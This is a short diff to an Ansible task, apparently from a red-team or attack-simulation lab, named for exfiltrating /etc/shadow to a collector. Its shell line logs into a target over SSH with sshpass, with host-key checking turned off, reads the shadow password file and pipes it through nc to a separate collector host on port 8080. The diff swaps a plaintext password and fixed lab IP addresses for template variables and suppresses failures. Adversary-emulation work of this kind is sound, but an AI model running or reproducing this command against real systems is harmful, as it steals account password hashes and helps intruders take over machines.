@@ -1,3 +1,4 @@
 ---
 - name: Action on Objectives - Exfiltrate /etc/shadow to collector
-  shell: "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@192.168.254.132 'cat /etc/shadow' | nc 192.168.254.131 8080"
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'cat /etc/shadow' | nc {{ collector_ip }} 8080"
+  failed_when: false
